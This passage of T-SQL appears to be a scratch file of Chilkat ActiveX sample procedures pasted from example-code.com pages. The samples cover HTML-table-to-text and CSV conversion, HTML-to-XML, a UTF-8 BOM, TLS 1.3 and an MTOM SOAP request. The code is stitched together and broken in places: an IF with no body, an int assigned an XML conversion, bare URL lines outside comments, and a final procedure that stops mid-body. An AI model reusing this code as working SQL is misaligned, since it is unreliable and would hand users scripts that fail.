    --  out of a document library. Represents an <span
    --  class="input">SP.CheckOutType</span> value: Online = 0; Offline = 1; None =
    --  2.</p><p>The checkout state of a file is independent of its locked
    --  state.</p></td></tr><tr><td data-th="Property"><p>ContentTag</p></td><td
    --  data-th="Type"><p><span class="input">String</span></p></td><td
    --  data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>Yes</p></td><td data-th="Description"><p>Returns internal version 
-- of content, used to validate document equality for read
    --  purposes.</p></td></tr><tr><td
    --  data-th="Property"><p>CustomizedPageStatus</p></td><td data-th="Type"><p><span
    --  class="input">Int32</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the customization status
    --  of the file. Represents an <span class="input">SP.CustomizedPageStatus</span>
    --  value: None = 0; Uncustomized = 1; Customized = 2.</p></td></tr><tr><td
    --  data-th="Property"><p>ETag</p></td><td data-th="Type"><p><span
    --  class="input">String</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the ETag
    --  value.</p></td></tr><tr><td data-th="Property"><p>Exists</p></td><td
    --  data-th="Type"><p><span class="input">Boolean</span></p></td><td
    --  data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>Yes</p></td><td data-th="Description"><p>Gets a value that 
-- specifies whether the file exists.</p></td></tr><tr><td
    --  data-th="Property"><p>Length</p></td><td data-th="Type"><p><span
    --  class="input">Int64</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets the size of the file in bytes, excluding the size
    --  of any Web Parts that are used in the file.</p></td></tr><tr><td
    --  data-th="Property"><p>Level</p></td><td data-th="Type"><p><span
    --  class="input">Byte</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the publishing level of
    --  the file. Represents an <span class="input">SP.FileLevel</span> value:
    --  Published = 1; Draft = 2; Checkout = 255.</p></td></tr><tr><td
    --  data-th="Property"><p>ListItemAllFields</p></td><td data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn531433.aspx#bk_ListItem">
    --  SP.ListItem</a></p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned 
-- with resource"><p>No</p></td><td data-th="Description"><p>Gets a value that 
-- specifies the list item field values for the list item corresponding to the
    --  file.</p></td></tr><tr><td data-th="Property"><p>LockedByUser</p></td><td
    --  data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn531432.aspx#bk_User">
    --  SP.User</a></p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>No</p></td><td data-th="Description"><p>Gets a value that returns 
-- the user that owns the current lock on the file.</p></td></tr><tr><td
    --  data-th="Property"><p>MajorVersion</p></td><td data-th="Type"><p><span
    --  class="input">Int32</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the major version of the
    --  file.</p></td></tr><tr><td data-th="Property"><p>MinorVersion</p></td><td
    --  data-th="Type"><p><span class="input">Int32</span></p></td><td
    --  data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>Yes</p></td><td data-th="Description"><p>Gets a value that 
-- specifies the minor version of the file.</p></td></tr><tr><td
    --  data-th="Property"><p>ModifiedBy</p></td><td data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn531432.aspx#bk_User">
    --  SP.User</a></p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>No</p></td><td data-th="Description"><p>Gets a value that returns 
-- the user who last modified the file.</p></td></tr><tr><td
    --  data-th="Property"><p>Name</p></td><td data-th="Type"><p><span
    --  class="input">String</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets the name of the file including the
    --  extension.</p></td></tr><tr><td
    --  data-th="Property"><p>ServerRelativeUrl</p></td><td data-th="Type"><p><span
    --  class="input">String</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets the relative URL of the file based on the URL for
    --  the server.</p></td></tr><tr><td data-th="Property"><p>TimeCreated</p></td><td
    --  data-th="Type"><p><span class="input">DateTime</span></p></td><td
    --  data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>Yes</p></td><td data-th="Description"><p>Gets a value that 
-- specifies when the file was created.</p></td></tr><tr><td
    --  data-th="Property"><p>TimeLastModified</p></td><td data-th="Type"><p><span
    --  class="input">DateTime</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies when the file was last
    --  modified.</p></td></tr><tr><td data-th="Property"><p>Title</p></td><td
    --  data-th="Type"><p><span class="input">String</span></p></td><td
    --  data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>Yes</p></td><td data-th="Description"><p>Gets a value that 
-- specifies the display name of the file.</p></td></tr><tr><td
    --  data-th="Property"><p>UiVersion</p></td><td data-th="Type"><p><span
    --  class="input">Int32</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the
    --  implementation-specific version identifier of the file.</p></td></tr><tr><td
    --  data-th="Property"><p>UiVersionLabel</p></td><td data-th="Type"><p><span
    --  class="input">String</span></p></td><td data-th="R/W"><p>R</p></td><td
    --  data-th="Returned with resource"><p>Yes</p></td><td
    --  data-th="Description"><p>Gets a value that specifies the
    --  implementation-specific version identifier of the file.</p></td></tr><tr><td
    --  data-th="Property"><p>Versions</p></td><td data-th="Type"><p><a
    --  href="https://msdn.microsoft.com/en-us/library/office/dn450841.aspx#bk_FileVersionCollection">SP.FileVersionCollection</a>
    --  </p></td><td data-th="R/W"><p>R</p></td><td data-th="Returned with 
-- resource"><p>No</p></td><td data-th="Description"><p>Gets a value that returns 
-- a collection of file version objects that represent the versions of the
    --  file.</p></td></tr></table>
    -- 

    DECLARE @h2x int
    EXEC @hr = sp_OACreate 'html_table_to_text.HtmlToXml', @h2x OUT
    IF @hr <> 0

    DECLARE @success int
    EXEC sp_OAMethod @h2x, 'SetHtmlFromFile', @success OUT, 'qa_data/htmlToText/htmlTable.html'

    --  First convert to well-formed XML that makes it easier to parse.
    DECLARE @xml int
    EXEC @hr = sp_OACreate 'html_table_to_text.Xml', @xml OUT

    EXEC sp_OAMethod @h2x, 'ToXml', @sTmp0 OUT
    EXEC sp_OAMethod @xml, 'LoadXml', @success OUT, @sTmp0
    EXEC sp_OAMethod @xml, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0

    --  The XML looks like this:

    --  <?xml version="1.0" encoding="utf-8" ?>
    --  <root>
    --      <table>
    --          <tr>
    --              <th>
    --                  <p>
    --                      <text>Property</text>
    --                  </p>
    --              </th>
    --              <th scope="col">
    --                  <p>
    --                      <text>Type</text>
    --                  </p>
    --              </th>
    --              <th scope="col">
    --                  <p>
    --                      <text>R/W</text>
    --                  </p>
    --              </th>
    --              <th scope="col">
    --                  <p>
    --                      <a href="https://msdn.microsoft.com/en-us/library/office/jj164022.aspx#NavigationProperties">
    --                          <text>Returned with resource</text>
    --                      </a>
    --                  </p>
    --              </th>
    --              <th scope="col">
    --                  <p>
    --                      <text>Description</text>
    --                  </p>
    --              </th>
    --          </tr>
    --          <tr>
    --              <td data-th="Property">
    --                  <p>
    --                      <text>Author</text>
    --                  </p>
    --              </td>
    --              <td data-th="Type">
    --                  <p>
    --                      <a href="https://msdn.microsoft.com/en-us/library/office/dn531432.aspx#bk_User">
    --                          <text>SP.User</text>
    --                      </a>
    --                  </p>
    --              </td>
    --              <td data-th="R/W">
    --                  <p>
    --                      <text>R</text>
    --                  </p>
    --              </td>
    --              <td data-th="Returned with resource">
    --                  <p>
    --                      <text>No</text>
    --                  </p>
    --              </td>
    --              <td data-th="Description">
    --                  <p>
    --                      <text>Gets a value that specifies the user who added the file.</text>
    --                  </p>
    --              </td>
    --          </tr>
    --  ...
    -- 


    PRINT '------------------------------------------------'

    --  Iterate over the XML, skipping the 1st table row, and emit
    --  the Property and Description for each row.

    DECLARE @sbPlainText int
    EXEC @hr = sp_OACreate 'html_table_to_text.StringBuilder', @sbPlainText OUT

    --  First move to the "table" node.
    EXEC sp_OAMethod @xml, 'FirstChild2', @success OUT

    --  Get the number of rows.
    DECLARE @numRows int
    EXEC sp_OAGetProperty @xml, 'NumChildren', @numRows OUT

    --  Indexing is 0-based, meaning the 1st row (i.e. the table headers) is at index 0.
    --  Skip it by starting with index 1.
    DECLARE @i int
    SELECT @i = 1
    WHILE @i < @numRows
      BEGIN
        EXEC sp_OASetProperty @xml, 'I', @i

        EXEC sp_OAMethod @xml, 'GetChildContent', @sTmp0 OUT, 'tr[i]|/A/td,data-th,Property|p|text'
        EXEC sp_OAMethod @sbPlainText, 'Append', @success OUT, @sTmp0
        EXEC sp_OAMethod @sbPlainText, 'Append', @success OUT, ': '
        EXEC sp_OAMethod @xml, 'GetChildContent', @sTmp0 OUT, 'tr[i]|/A/td,data-th,Description|p|text'
        EXEC sp_OAMethod @sbPlainText, 'AppendLine', @success OUT, @sTmp0, 1

        SELECT @i = @i + 1
      END

    EXEC sp_OAMethod @sbPlainText, 'GetAsString', @sTmp0 OUT
    PRINT @sTmp0

    --  The output is:

    --  Author: Gets a value that specifies the user who added the file.
    --  CheckedOutByUser: Gets a value that returns the user who has checked out the file.
    --  CheckInComment: Gets a value that returns the comment used when a document is checked in to a document library.
    --  CheckOutType: Gets a value that indicates how the file is checked out of a document library. Represents an
    --  ContentTag: Returns internal version of content, used to validate document equality for read purposes.
    --  CustomizedPageStatus: Gets a value that specifies the customization status of the file. Represents an
    --  ETag: Gets a value that specifies the ETag value.
    --  Exists: Gets a value that specifies whether the file exists.
    --  Length: Gets the size of the file in bytes, excluding the size of any Web Parts that are used in the file.
    --  Level: Gets a value that specifies the publishing level of the file. Represents an
    --  ListItemAllFields: Gets a value that specifies the list item field values for the list item corresponding to the file.
    --  LockedByUser: Gets a value that returns the user that owns the current lock on the file.
    --  MajorVersion: Gets a value that specifies the major version of the file.
    --  MinorVersion: Gets a value that specifies the minor version of the file.
    --  ModifiedBy: Gets a value that returns the user who last modified the file.
    --  Name: Gets the name of the file including the extension.
    --  ServerRelativeUrl: Gets the relative URL of the file based on the URL for the server.
    --  TimeCreated: Gets a value that specifies when the file was created.
    --  TimeLastModified: Gets a value that specifies when the file was last modified.
    --  Title: Gets a value that specifies the display name of the file.
    --  UiVersion: Gets a value that specifies the implementation-specific version identifier of the file.
    --  UiVersionLabel: Gets a value that specifies the implementation-specific version identifier of the file.
    --  Versions: Gets a value that returns a collection of file version objects that represent the versions of the file.
    -- 

    EXEC @hr = sp_OADestroy @h2x
    EXEC @hr = sp_OADestroy @xml
    EXEC @hr = sp_OADestroy @sbPlainText


END
GO

--https://www.example-code.com/sql/html_table_to_csv.asp

CREATE PROCEDURE html_table_to_csv
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    -- First download the HTML containing the table
    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @bdHtml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.BinData', @bdHtml OUT

    DECLARE @success int
    EXEC sp_OAMethod @http, 'QuickGetBd', @success OUT, 'https://example-code.com/data/etf_table.html', @bdHtml
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @http, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @http
        EXEC @hr = sp_OADestroy @bdHtml
        RETURN
      END

    -- Convert to XML.
    DECLARE @htx int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HtmlToXml', @htx OUT

    EXEC sp_OAMethod @htx, 'SetHtmlBd', @success OUT, @bdHtml

    DECLARE @sbXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sbXml OUT

    EXEC sp_OAMethod @htx, 'ToXmlSb', @success OUT, @sbXml

    DECLARE @xml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @xml OUT

    EXEC sp_OAMethod @xml, 'LoadSb', @success OUT, @sbXml, 1

    -- Remove attributes and sub-trees we don't need.
    -- (In other words, we're getting rid of clutter...)
    DECLARE @numRemoved int
    EXEC sp_OAMethod @xml, 'PruneTag', @numRemoved OUT, 'thead'
    EXEC sp_OAMethod @xml, 'PruneAttribute', @numRemoved OUT, 'style'
    EXEC sp_OAMethod @xml, 'PruneAttribute', @numRemoved OUT, 'class'

    -- Scrub the element and attribute content.
    EXEC sp_OAMethod @xml, 'Scrub', NULL, 'ContentTrimEnds,ContentTrimInside,AttrTrimEnds,AttrTrimInside'

    -- Let's see what we have...
    EXEC sp_OAMethod @xml, 'GetXml', @sTmp0 OUT
    PRINT @sTmp0

    -- We have the following XML.
    -- Copy this XML into the online tool at Generate Parsing Code from XML
    -- as a starting point for accessing the data..

    -- <?xml version="1.0" encoding="utf-8"?>
    -- <root>
    --     <html>
    --         <head>
    --             <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
    --         </head>
    --         <body text="#000000" bgcolor="#FFFFFF">
    --             <div>
    --                 <div>
    --                     <table role="grid" data-scrollx="true" data-sortdirection="desc" data-sorton="-1"/>
    --                 </div>
    --             </div>
    --             <div>
    --                 <table id="topHoldingsTable" role="grid" data-scrollx="true" data-sortdirection="desc" data-sorton="-1">
    --                     <tbody>
    --                         <tr role="row">
    --                             <td>
    --                                 <text>ITUB4</text>
    --                             </td>
    --                             <td>
    --                                 <text>ITAU UNIBANCO HOLDING PREF SA</text>
    --                             </td>
    --                             <td>
    --                                 <text>Financials</text>
    --                             </td>
    --                             <td>
    --                                 <text>Brazil</text>
    --                             </td>
    --                             <td>
    --                                 <text>10.94</text>
    --                             </td>
    --                             <td>
    --                                 <text>998,954,813.73</text>
    --                             </td>
    --                         </tr>
    --                         <tr role="row">
    --                             <td>
    --                                 <text>BBDC4</text>
    --                             </td>
    --                             <td>
    --                                 <text>BANCO BRADESCO PREF SA</text>
    --                             </td>
    --                             <td>
    --                                 <text>Financials</text>
    --                             </td>
    --                             <td>
    --                                 <text>Brazil</text>
    --                             </td>
    --                             <td>
    --                                 <text>9.01</text>
    --                             </td>
    --                             <td>
    --                                 <text>822,164,622.75</text>
    --                             </td>
    --                         </tr>
    -- 			...
    -- 			...
    -- 			...
    --                     </tbody>
    --                 </table>
    --             </div>
    --         </body>
    --     </html>
    -- </root>

    -- 
    -- This is the code generated by the online tool:
    -- 
    DECLARE @i int

    DECLARE @count_i int

    DECLARE @table_role nvarchar(4000)

    DECLARE @table_data_scrollx nvarchar(4000)

    DECLARE @table_data_sortdirection nvarchar(4000)

    DECLARE @table_data_sorton nvarchar(4000)

    DECLARE @table_id nvarchar(4000)

    DECLARE @j int

    DECLARE @count_j int

    DECLARE @tr_role nvarchar(4000)

    DECLARE @k int

    DECLARE @count_k int

    DECLARE @tagPath nvarchar(4000)

    DECLARE @text nvarchar(4000)

    SELECT @i = 0
    EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_i OUT, 'html|body|div'
    WHILE @i < @count_i
      BEGIN
        EXEC sp_OASetProperty @xml, 'I', @i
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_role OUT, 'html|body|div[i]|div|table|(role)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_scrollx OUT, 'html|body|div[i]|div|table|(data-scrollx)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_sortdirection OUT, 'html|body|div[i]|div|table|(data-sortdirection)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_sorton OUT, 'html|body|div[i]|div|table|(data-sorton)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_id OUT, 'html|body|div[i]|table|(id)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_role OUT, 'html|body|div[i]|table|(role)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_scrollx OUT, 'html|body|div[i]|table|(data-scrollx)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_sortdirection OUT, 'html|body|div[i]|table|(data-sortdirection)'
        EXEC sp_OAMethod @xml, 'ChilkatPath', @table_data_sorton OUT, 'html|body|div[i]|table|(data-sorton)'
        SELECT @j = 0
        EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_j OUT, 'html|body|div[i]|table|tbody|tr'
        WHILE @j < @count_j
          BEGIN
            EXEC sp_OASetProperty @xml, 'J', @j
            EXEC sp_OAMethod @xml, 'ChilkatPath', @tr_role OUT, 'html|body|div[i]|table|tbody|tr[j]|(role)'
            SELECT @k = 0
            EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_k OUT, 'html|body|div[i]|table|tbody|tr[j]|td'
            WHILE @k < @count_k
              BEGIN
                EXEC sp_OASetProperty @xml, 'K', @k
                EXEC sp_OAMethod @xml, 'GetChildContent', @text OUT, 'html|body|div[i]|table|tbody|tr[j]|td[k]|text'
                SELECT @k = @k + 1
              END
            SELECT @j = @j + 1
          END
        SELECT @i = @i + 1
      END

    -- Let's modify the above code to build the CSV.
    DECLARE @csv int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Csv', @csv OUT

    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 0, 'Ticker'
    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 1, 'Name'
    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 2, 'Sector'
    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 3, 'Country'
    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 4, 'Weight'
    EXEC sp_OAMethod @csv, 'SetColumnName', @success OUT, 5, 'Notional Vaue'

    SELECT @i = 0
    EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_i OUT, 'html|body|div'
    WHILE @i < @count_i
      BEGIN
        EXEC sp_OASetProperty @xml, 'I', @i
        SELECT @j = 0
        EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_j OUT, 'html|body|div[i]|table|tbody|tr'
        WHILE @j < @count_j
          BEGIN
            EXEC sp_OASetProperty @xml, 'J', @j
            SELECT @k = 0
            EXEC sp_OAMethod @xml, 'NumChildrenHavingTag', @count_k OUT, 'html|body|div[i]|table|tbody|tr[j]|td'
            WHILE @k < @count_k
              BEGIN
                EXEC sp_OASetProperty @xml, 'K', @k
                EXEC sp_OAMethod @xml, 'GetChildContent', @sTmp0 OUT, 'html|body|div[i]|table|tbody|tr[j]|td[k]|text'
                EXEC sp_OAMethod @csv, 'SetCell', @success OUT, @j, @k, @sTmp0
                SELECT @k = @k + 1
              END
            SELECT @j = @j + 1
          END
        SELECT @i = @i + 1
      END

    EXEC sp_OAMethod @csv, 'SaveFile', @success OUT, 'qa_output/brasil_etf.csv'
    DECLARE @csvStr nvarchar(4000)
    EXEC sp_OAMethod @csv, 'SaveToString', @csvStr OUT

    PRINT @csvStr

    -- Our CSV looks like this:
    -- Ticker,Name,Sector,Country,Weight,Notional Vaue
    -- ITUB4,ITAU UNIBANCO HOLDING PREF SA,Financials,Brazil,10.94,"998,954,813.73"
    -- BBDC4,BANCO BRADESCO PREF SA,Financials,Brazil,9.01,"822,164,622.75"
    -- VALE3,CIA VALE DO RIO DOCE SH,Materials,Brazil,8.60,"785,290,260.07"
    -- PETR4,PETROLEO BRASILEIRO PREF SA,Energy,Brazil,5.68,"518,124,434.10"
    -- PETR3,PETROBRAS,Energy,Brazil,4.86,"443,254,438.53"
    -- B3SA3,B3 BRASIL BOLSA BALCAO SA,Financials,Brazil,4.57,"417,636,740.16"
    -- ABEV3,AMBEV SA,Consumer Staples,Brazil,4.57,"417,216,913.63"
    -- BBAS3,BANCO DO BRASIL SA,Financials,Brazil,3.25,"296,921,232.15"
    -- ITSA4,ITAUSA INVESTIMENTOS ITAU PREF SA,Financials,Brazil,2.90,"265,153,684.52"
    -- LREN3,LOJAS RENNER SA,Consumer Discretionary,Brazil,2.25,"205,832,175.98"
    -- 

    EXEC @hr = sp_OADestroy @http
    EXEC @hr = sp_OADestroy @bdHtml
    EXEC @hr = sp_OADestroy @htx
    EXEC @hr = sp_OADestroy @sbXml
    EXEC @hr = sp_OADestroy @xml
    EXEC @hr = sp_OADestroy @csv


END
GO

--https://www.example-code.com/sql/htmlToText_simple.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @h2t int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HtmlToText', @h2t OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Set the HTML:
    DECLARE @html nvarchar(4000)

    SELECT @html = '<html><body><p>This is a test.</p><blockquote>Here is text within a blockquote</blockquote></body></html>'

    DECLARE @plainText nvarchar(4000)

    EXEC sp_OAMethod @h2t, 'ToText', @plainText OUT, @html


    PRINT @plainText

    -- The output looks like this:

    -- This is a test.
    -- 
    --     Here is text within a blockquote

    EXEC @hr = sp_OADestroy @h2t


END
GO

--https://www.example-code.com/sql/htmlToXml_convertFile.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @htmlToXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HtmlToXml', @htmlToXml OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- Indicate the charset of the output XML we'll want.
    EXEC sp_OASetProperty @htmlToXml, 'XmlCharset', 'utf-8'

    DECLARE @success int
    EXEC sp_OAMethod @htmlToXml, 'ConvertFile', @success OUT, 'test.html', 'out.xml'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @htmlToXml, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
      END
    ELSE
      BEGIN

        PRINT 'Success'
      END

    EXEC @hr = sp_OADestroy @htmlToXml


END
GO


--https://www.example-code.com/sql/drop_formatting_tags.asp

CREATE PROCEDURE drop_formatting_tags
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @html nvarchar(4000)
    SELECT @html = '<html><body><p><b>Hello</b> World!<p>This is a test</body></html>'

    -- Convert the above to XML
    DECLARE @h2x int
	set @h2x = convert(xml,@html)
    --EXEC @hr = sp_OACreate 'Chilkat_9_5_0.HtmlToXml', @h2x OUT

    -- By default, text formatting tags are dropped. Text formatting HTML tags are: b, font, i, u, br, center, em, strong, big, tt, s, small, strike, sub, and sup
    EXEC sp_OASetProperty @h2x, 'Html', @html
    EXEC sp_OAMethod @h2x, 'ToXml', @sTmp0 OUT
    PRINT @sTmp0

    -- The resulting XML is:

    -- <?xml version="1.0" encoding="utf-8"?>
    -- <root>
    --     <html>
    --         <body>
    --             <p>
    --                 <text>Hello World!</text>
    --             </p>
    --             <p>
    --                 <text>This is a test</text>
    --             </p>
    --         </body>
    --     </html>
    -- </root>

    -- To preserve text formatting tags, put the h2x instance into the mode where text formatting tags are not dropped:
    EXEC sp_OAMethod @h2x, 'UndropTextFormattingTags', NULL

    -- Convert again to see the difference:
    EXEC sp_OAMethod @h2x, 'ToXml', @sTmp0 OUT
    PRINT @sTmp0

    -- The resulting XML is:

    -- <?xml version="1.0" encoding="utf-8"?>
    -- <root>
    --     <html>
    --         <body>
    --             <p>
    --                 <b>
    --                     <text>Hello</text>
    --                 </b>
    --                 <text> World!</text>
    --             </p>
    --             <p>
    --                 <text>This is a test</text>
    --             </p>
    --         </body>
    --     </html>
    -- </root>

    -- Call DropTextFormattingTags to put the h2x instance back in "drop" mode.
    EXEC sp_OAMethod @h2x, 'DropTextFormattingTags', NULL

    -- Convert again to see the difference:
    EXEC sp_OAMethod @h2x, 'ToXml', @sTmp0 OUT
    PRINT @sTmp0

    -- The resulting XML is:

    -- <?xml version="1.0" encoding="utf-8"?>
    -- <root>
    --     <html>
    --         <body>
    --             <p>
    --                 <text>Hello World!</text>
    --             </p>
    --             <p>
    --                 <text>This is a test</text>
    --             </p>
    --         </body>
    --     </html>
    -- </root>

    EXEC @hr = sp_OADestroy @h2x


END
GO




https://www.example-code.com/sql/charset_add_utf8_bom_to_file.asp


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example assumes the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @charset int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Charset', @charset OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @charset, 'FromCharset', 'utf-8'
    EXEC sp_OASetProperty @charset, 'ToCharset', 'bom-utf-8'

    DECLARE @success int
    EXEC sp_OAMethod @charset, 'ConvertFile', @success OUT, 'qa_data/txt/helloWorld.txt', 'qa_output/helloWorldBom.txt'
    IF @success <> 1
      BEGIN
        EXEC sp_OAGetProperty @charset, 'LastErrorText', @sTmp0 OUT
        PRINT @sTmp0
        EXEC @hr = sp_OADestroy @charset
        RETURN
      END


    PRINT 'Success.'

    EXEC @hr = sp_OADestroy @charset


END
GO



https://www.example-code.com/sql/http_enable_tls_1_3.asp

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    -- To enable TLS 1.3, add the keyword "EnableTls13" to the UncommonOptions property.
    -- (TLS 1.3 will be enabled by default in future versions of Chilkat.)
    EXEC sp_OASetProperty @http, 'UncommonOptions', 'EnableTls13'

    -- With "EnableTls13" present, Chilkat will offer TLS 1.3 as a choice to the server for all TLS connections.

    EXEC @hr = sp_OADestroy @http


END
GO








https://www.example-code.com/sql/mtom_xop_attachment.asp

--Content-Type: Multipart/Related; start-info="text/xml"; type="application/xop+xml"; boundary="----=_Part_0_1744155.1118953559416"
--Content-Length: 3453
--SOAPAction: "some-SOAP-action"

--------=_Part_1_4558657.1118953559446
--Content-Type: application/xop+xml; type="text/xml"; charset=utf-8

--<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
--  <soap:Body>
--    <Detail xmlns="http://example.org/mtom/data">
--      <image>
--        <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="cid:5aeaa450-17f0-4484-b845-a8480c363444@example.org" />
--      </image>
--    </Detail>
--  </soap:Body>
--</soap:Envelope>

--------=_Part_1_4558657.1118953559446
--Content-Type: image/jpeg
--Content-ID: <5aeaa450-17f0-4484-b845-a8480c363444@example.org>


--... binary data ...




CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @sTmp0 nvarchar(4000)
    -- This example requires the Chilkat API to have been previously unlocked.
    -- See Global Unlock Sample for sample code.

    DECLARE @http int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Http', @http OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @soapXml int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Xml', @soapXml OUT

    EXEC sp_OASetProperty @soapXml, 'Tag', 'soap:Envelope'
    DECLARE @success int
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:soap', 'http://schemas.xmlsoap.org/soap/envelope/'

    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'soap:Body', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0

    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'Detail', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns', 'http://example.org/mtom/data'

    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'image', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0

    EXEC sp_OAMethod @soapXml, 'NewChild2', NULL, 'xop:Include', ''
    EXEC sp_OAMethod @soapXml, 'GetChild2', @success OUT, 0
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'xmlns:xop', 'http://www.w3.org/2004/08/xop/include'
    EXEC sp_OAMethod @soapXml, 'AddAttribute', @success OUT, 'href', 'cid:5aeaa450-17f0-4484-b845-a8480c363444@example.org'

    EXEC sp_OAMethod @soapXml, 'GetRoot2', NULL
    EXEC sp_OASetProperty @soapXml, 'EmitXmlDecl', 0

    DECLARE @xmlBody nvarchar(4000)
    EXEC sp_OAMethod @soapXml, 'GetXml', @xmlBody OUT

    PRINT @xmlBody

    DECLARE @req int
